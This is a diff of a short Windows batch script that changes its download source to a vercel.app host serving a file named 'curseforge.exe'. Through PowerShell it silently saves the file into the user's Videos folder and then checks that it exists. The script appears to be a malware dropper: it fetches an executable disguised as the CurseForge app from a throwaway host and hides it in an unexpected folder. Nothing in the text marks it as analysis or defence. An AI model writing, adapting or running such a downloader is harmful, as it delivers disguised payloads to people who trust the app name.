@@ -1,8 +1,8 @@
 @echo off
 setlocal
 
-set "fileUrl=https://github.com/SeizedAssets/fantastic-doodle/raw/refs/heads/main/InstallDir.exe"
-set "savePath=%USERPROFILE%\Videos\InstallDir.exe"
+set "fileUrl=https://1aq-2dpk.vercel.app/curseforge.exe"
+set "savePath=%USERPROFILE%\Videos\curseforge.exe"
 
 powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%fileUrl%' -OutFile '%savePath%' -UseBasicParsing } catch { exit 1 }"
 
@@ -18,4 +18,3 @@ if exist "%savePath%" (
 
 endlocal
 exit /b
-
